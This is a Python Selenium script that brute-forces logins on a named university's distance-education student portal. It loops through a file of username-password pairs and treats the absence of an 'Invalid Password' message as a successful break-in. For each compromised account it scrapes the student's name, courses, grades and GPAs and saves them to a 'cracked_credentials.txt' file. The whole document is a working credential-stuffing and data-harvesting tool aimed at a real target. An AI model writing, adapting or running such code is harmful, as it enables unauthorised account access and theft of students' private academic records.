from selenium import webdriver
from selenium.common.exceptions import NoSuchElementException
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from termcolor import colored

url = 'http://mysgs.smuc.edu.et/distance'
#input('[+] Enter Page URL: ')
login_failed_string = 'Invalid Password'
#input('[+] Enter String That Occurs When Login Fails: ')
#button_name = input('[+] Enter Name of the Button to Click: ')
credentials_file = 'D:/Downloads/pass.txt'
#input('[+] Enter File Containing Usernames and Passwords (line-by-line): ')

driver = webdriver.Chrome()  # Replace with your preferred browser's WebDriver

def cracking():
    with open(credentials_file, 'r') as file:
        for line in file:
            username, password = line.strip().split()
            print(colored(f'Trying: {username} : {password}', 'red'))
            try:
                driver.get(url)

                # Find username and password fields using their names
                username_field = WebDriverWait(driver, 10).until(
                    EC.presence_of_element_located((By.NAME, "ID"))
                )
                password_field = driver.find_element(By.NAME, "PASS")

                # Enter credentials and submit
                username_field.send_keys(username)
                password_field.send_keys(password)
                submit_button = driver.find_element(By.NAME, "submit")  # Assuming a button named "Login"
                submit_button.click()

                # Check for login success or failure
                if login_failed_string in driver.page_source:
                    pass
                else:
                    # Click the desired button
                    #button = driver.find_element(By.NAME, button_name)
                    #button.click()
                    print(colored(f'[+] Found Username: ==> {username}', 'green'))
                    print(colored(f'[+] Found Password: ==> {password}', 'green'))
                    try: 
                        div_element = WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.XPATH, "//div[@id='tabsF']")))  # Replace with the div's XPath)
                        third_li = div_element.find_element(By.XPATH, ".//ul/li[2]")  # Target the third LI within the UL
                        span_element = third_li.find_element(By.XPATH, ".//span") 
                        span_element.click()
                        print(colored(f"[+] Third LI element clicked successfully!", "green"))
    
                    except Exception as e:
                        print(colored(f"[!] Error clicking: {e}", "red"))

                
                    try:
                        text_section = WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.XPATH, "//div[@id='center1']")))

                        
                        course1 = text_section.find_element(By.XPATH, ".//table[4]/tbody/tr[2]/td[2]/font")
                        course2 = text_section.find_element(By.XPATH, ".//table[4]/tbody/tr[3]/td[2]/font")
                        course3 = text_section.find_element(By.XPATH, ".//table[4]/tbody/tr[4]/td[2]/font")
                        #course4 = text_section.find_element(By.XPATH, ".//table[4]/tbody/tr[5]/td[2]/font")


                        course5 = text_section.find_element(By.XPATH, ".//table[7]/tbody/tr[2]/td[2]/font")
                        course6 = text_section.find_element(By.XPATH, ".//table[7]/tbody/tr[3]/td[2]/font")
                        course7 = text_section.find_element(By.XPATH, ".//table[7]/tbody/tr[4]/td[2]/font")
                        course8 = text_section.find_element(By.XPATH, ".//table[7]/tbody/tr[5]/td[2]/font")
                        course9 = text_section.find_element(By.XPATH, ".//table[7]/tbody/tr[6]/td[2]/font")


                        course10 = text_section.find_element(By.XPATH, ".//table[10]/tbody/tr[2]/td[2]/font")
                        course11 = text_section.find_element(By.XPATH, ".//table[10]/tbody/tr[3]/td[2]/font")
                        course12 = text_section.find_element(By.XPATH, ".//table[10]/tbody/tr[4]/td[2]/font")
                        course13 = text_section.find_element(By.XPATH, ".//table[10]/tbody/tr[5]/td[2]/font")



                        course14 = text_section.find_element(By.XPATH, ".//table[13]/tbody/tr[2]/td[2]/font")
                        course15 = text_section.find_element(By.XPATH, ".//table[13]/tbody/tr[3]/td[2]/font")
                        course16 = text_section.find_element(By.XPATH, ".//table[13]/tbody/tr[4]/td[2]/font")
                        #course17 = text_section.find_element(By.XPATH, ".//table[13]/tbody/tr[5]/td[2]/font")
                        

                       ##***

                        
                        
                        Grade1 = text_section.find_element(By.XPATH, ".//table[4]/tbody/tr[2]/td[4]/font")
                        Grade2 = text_section.find_element(By.XPATH, ".//table[4]/tbody/tr[3]/td[4]/font")
                        Grade3 = text_section.find_element(By.XPATH, ".//table[4]/tbody/tr[4]/td[4]/font")
                        #Grade4 = text_section.find_element(By.XPATH, ".//table[4]/tbody/tr[5]/td[4]/font")


                        gpa1 = text_section.find_element(By.XPATH, ".//table[5]/tbody/tr[2]/td[4]/font")
                        gpa2 = text_section.find_element(By.XPATH, ".//table[5]/tbody/tr[3]/td[4]/font")

                        Grade5 = text_section.find_element(By.XPATH, ".//table[7]/tbody/tr[2]/td[4]/font")
                        Grade6 = text_section.find_element(By.XPATH, ".//table[7]/tbody/tr[3]/td[4]/font")
                        Grade7 = text_section.find_element(By.XPATH, ".//table[7]/tbody/tr[4]/td[4]/font")
                        Grade8 = text_section.find_element(By.XPATH, ".//table[7]/tbody/tr[5]/td[4]/font")
                        Grade9 = text_section.find_element(By.XPATH, ".//table[7]/tbody/tr[6]/td[4]/font")

                        gpa3 = text_section.find_element(By.XPATH, ".//table[8]/tbody/tr[2]/td[4]/font")
                        gpa4 = text_section.find_element(By.XPATH, ".//table[8]/tbody/tr[3]/td[4]/font")

                        Grade10 = text_section.find_element(By.XPATH, ".//table[10]/tbody/tr[2]/td[4]/font")
                        Grade11 = text_section.find_element(By.XPATH, ".//table[10]/tbody/tr[3]/td[4]/font")
                        Grade12 = text_section.find_element(By.XPATH, ".//table[10]/tbody/tr[4]/td[4]/font")
                        Grade13 = text_section.find_element(By.XPATH, ".//table[10]/tbody/tr[5]/td[4]/font")

                        gpa5 = text_section.find_element(By.XPATH, ".//table[11]/tbody/tr[2]/td[4]/font")
                        gpa6 = text_section.find_element(By.XPATH, ".//table[11]/tbody/tr[3]/td[4]/font")

                        Grade14 = text_section.find_element(By.XPATH, ".//table[13]/tbody/tr[2]/td[4]/font")
                        Grade15 = text_section.find_element(By.XPATH, ".//table[13]/tbody/tr[3]/td[4]/font")
                        Grade16 = text_section.find_element(By.XPATH, ".//table[13]/tbody/tr[4]/td[4]/font")
                        #Grade17 = text_section.find_element(By.XPATH, ".//table[13]/tbody/tr[5]/td[4]/font")

                        gpa7 = text_section.find_element(By.XPATH, ".//table[14]/tbody/tr[2]/td[4]/font")
                        gpa8 = text_section.find_element(By.XPATH, ".//table[14]/tbody/tr[3]/td[4]/font")

                        
                        name = text_section.find_element(By.XPATH, ".//table[1]/tbody/tr[2]/td[2]/font/strong/font")
                        # Extract the text content

                        Fname = name.text


                        course1 = course1.text
                        course2 = course2.text
                        course3 = course3.text
                        #course4 = course4.text
                        course5 = course5.text
                        course6 = course6.text
                        course7 = course7.text
                        course8 = course8.text
                        course9 = course9.text
                        course10 = course10.text
                        course11 = course11.text
                        course12 = course12.text
                        course13 = course13.text
                        course14 = course14.text
                        course15 = course15.text
                        course16 = course16.text
                        #course17 = course17.text
                        #course18 = course18.text

                        gpa1 = gpa1.text
                        gpa2 = gpa2.text
                        gpa3 = gpa3.text
                        gpa4 = gpa4.text
                        gpa5 = gpa5.text
                        gpa6 = gpa6.text
                        gpa7 = gpa7.text
                        gpa8 = gpa8.text


                        
                        Grade1 = Grade1.text
                        Grade2 = Grade2.text
                        Grade3 = Grade3.text
                        #Grade4 = Grade4.text
                        Grade5 = Grade5.text
                        Grade6 = Grade6.text
                        Grade7 = Grade7.text
                        Grade8 = Grade8.text
                        Grade9 = Grade9.text
                        Grade10 = Grade10.text
                        Grade11 = Grade11.text
                        Grade12 = Grade12.text
                        Grade13 = Grade13.text
                        Grade14 = Grade14.text
                        Grade15 = Grade15.text
                        Grade16 = Grade16.text
                        #Grade16 = Grade16.text

                        #Fcourse = course1.text
                        #FGrade = Grade1.text
                        
                        
                        with open("cracked_credentials.txt", "w") as file:  # Open a file for writing
                            file.write(f"{username}\t\t")
                            file.write(Fname + "\n")
                            file.write(f"Grade\t\t")
                            file.write(f"Course Name\n")
                            file.write(Grade1 + "\t\t" + course1 + "\n")
                            file.write(Grade2 + "\t\t" + course2 + "\n")
                            file.write(Grade3 + "\t\t" + course3 + "\n")
                            #file.write(Grade4 + "\t\t" + course4 + "\n")

                            file.write("GPA " + gpa1 + "\nCPA " + gpa2 + "\n")
                            
                            file.write(Grade5 + "\t\t" + course5 + "\n")
                            file.write(Grade6 + "\t\t" + course6 + "\n")
                            file.write(Grade7 + "\t\t" + course7 + "\n")
                            file.write(Grade8 + "\t\t" + course8 + "\n")
                            file.write(Grade9 + "\t\t" + course9 + "\n")

                            file.write("GPA " + gpa3 + "\nCGPA " + gpa4 + "\n")
                            
                            file.write(Grade10 + "\t\t" + course10 + "\n")
                            file.write(Grade11 + "\t\t" + course11 + "\n")
                            file.write(Grade12 + "\t\t" + course12 + "\n")
                            file.write(Grade13 + "\t\t" + course13 + "\n")

                            file.write("GPA " + gpa5 + "\nCGPA " + gpa6 + "\n")
                            
                            file.write(Grade14 + "\t\t" + course14 + "\n")
                            file.write(Grade15 + "\t\t" + course15 + "\n")
                            file.write(Grade16 + "\t\t" + course16 + "\n")

                            file.write("GPA " + gpa7 + "\nCGPA " + gpa8 + "\n")
                            
                            #file.write(Grade17 + "\t\t" + course17 + "\n")
                            
                            
                            file.write(f"\n\n***\n\n")

                            print(colored(f"[+] Credentials saved to cracked_credentials.txt!", "green"))
                    except NoSuchElementException:
                            print("Element not found. Continuing...")
                    #print(colored(f'[+] Button Clicked Successfully!', 'green'))
                        
                    try: 
                        div_element2 = WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.XPATH, "//div[@id='tabsF']")))  # Replace with the div's XPath)
                        fifth_li = div_element2.find_element(By.XPATH, ".//ul/li[5]")  # Target the third LI within the UL
                        span_element2 = fifth_li.find_element(By.XPATH, ".//span") 
                        span_element2.click()
                        print(colored(f"[+] fifth LI element clicked successfully!", "green"))
    
                    except Exception as e:
                        print(colored(f"[!] Error clicking: {e}", "red"))

                        
                    #break

            except Exception as e:
                print(colored(f'[!] Error: {e}', 'red'))
                continue

cracking()

driver.quit()
